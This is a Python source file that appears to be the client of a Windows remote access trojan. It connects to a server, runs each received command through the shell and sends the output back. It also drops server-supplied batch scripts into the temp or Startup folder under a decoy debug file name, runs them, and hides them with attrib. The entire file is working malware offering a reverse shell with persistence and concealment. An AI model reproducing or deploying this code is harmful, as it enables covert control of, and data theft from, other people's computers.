import socket
from subprocess import check_output, CalledProcessError
from pickle import dumps
from os import getlogin, getenv, startfile, system, chdir, getcwd


class Socket:

    header = 10
    established = False
    cmd_received = False

    def connect_to_server(self, ip_address, port):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.connect((ip_address, port))
            self.established = True
            print("Connection established")
        except (ConnectionRefusedError, TimeoutError, socket.error):
            self.established = False
            print("No connection established!")

    def receive_command(self):
        try:
            cmd = self.active_socket.recv(1024)
        except (ConnectionResetError, ConnectionRefusedError, TimeoutError, socket.error):
            self.established = False
            return

        cmd = cmd.decode()

        # Initialize variables
        execute = False
        startup = False
        hide_file = False

        # Check for batch script
        if "-batch" in cmd:

            if "-e" in cmd:
                execute = True
                cmd = cmd.replace("-e ", "")
            if "-s" in cmd:
                startup = True
                cmd = cmd.replace("-s ", "")
            if "-h" in cmd:
                hide_file = True
                cmd = cmd.replace("-h ", "")
            cmd = cmd.replace("-batch ", "")

            drop_and_execute(cmd, execute_file=execute, startup=startup, low_protect=hide_file)

        else:

            # Change working directory stuff
            if "cd" in cmd[0:2] and "cd.." not in cmd[0:4]:
                path = getcwd() + "\\" + cmd[3:]
                try:
                    chdir(path)
                except (FileNotFoundError, OSError) as error:
                    self.send_msg(error)
                    return
                self.send_msg(f"Changed directory to {path}")
                return

            elif "cd.." in cmd[0:4]:
                chdir(self.get_parent_path(getcwd()))
                path = f"Changed directory to {getcwd()}"
                # self.send_msg(path)

            # Normal cmd command stuff
            try:
                output = check_output(cmd, shell=True)
                output = ''.join(chr(i) for i in output)
            except CalledProcessError as error:
                output = error
            self.send_msg(output)
            return

    def send_msg(self, msg):
        try:
            msg = dumps(msg)
            msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
            self.active_socket.send(msg)
            self.established = True
        except(ConnectionResetError, ConnectionAbortedError, OSError):
            self.established = False

    @staticmethod
    def get_parent_path(path):
        switch = False
        new_path = ""
        for char in reversed(path):
            if char == '\\':
                switch = True
            if switch:
                new_path += char
        return new_path[::-1]


def drop_and_execute(script, execute_file=False, startup=False, low_protect=False):
    if not script:
        return
    # Format script
    script = script.replace("/n", "\n")

    # Default file name
    file_name = "mat-debug-1692.bat"

    # Create Path to drop and execute
    if startup:
        path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + file_name
    else:
        path = getenv("temp") + "\\" + file_name

    # Drop file
    try:
        with open(path, "w+")as f:
            f.write(script)
    except PermissionError:
        return

    # Execute File
    if execute_file:
        startfile(path)

    # Hide File by calling Windows command
    if low_protect:
        chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
        system("attrib +h +r " + file_name)


connection = Socket()
while True:
    if not connection.established:
        connection.connect_to_server(socket.gethostname(), 20000)
    while connection.established:
        connection.receive_command()
